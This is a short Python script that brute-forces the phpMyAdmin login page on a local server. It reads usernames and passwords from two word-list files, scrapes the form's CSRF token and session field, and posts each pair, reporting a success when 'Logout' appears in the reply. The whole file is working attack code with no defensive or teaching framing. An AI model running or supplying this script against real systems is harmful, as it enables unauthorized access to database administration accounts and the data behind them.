import requests
from bs4 import BeautifulSoup

# Target URL
url = 'http://localhost/phpmyadmin/index.php'

# Function to read usernames and passwords from files
def read_file(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file]

# Read usernames and passwords from files
usernames = read_file('user.txt')
passwords = read_file('pass.txt')

# Function to perform the brute-force attack
def brute_force(username, password):
    # Create a session
    session = requests.Session()

    # Get the login page to extract the CSRF token
    login_page = session.get(url)
    soup = BeautifulSoup(login_page.content, 'html.parser')
    token = soup.find('input', {'name': 'token'})['value']
    set_session = soup.find('input', {'name': 'set_session'})['value']

    # Prepare the payload
    payload = {
        'pma_username': username,
        'pma_password': password,
        'token': token,
        'set_session': set_session,
        'server': '1'
    }

    # Send the POST request
    response = session.post(url, data=payload)

    # Check if the login was successful
    if 'Logout' in response.text:
        print(f"Success! Username: {username}, Password: {password}")
        return True
    else:
        print(f"Failed: {username} - {password}")
        return False

# Brute-force attack
for username in usernames:
    for password in passwords:
        if brute_force(username, password):
            break
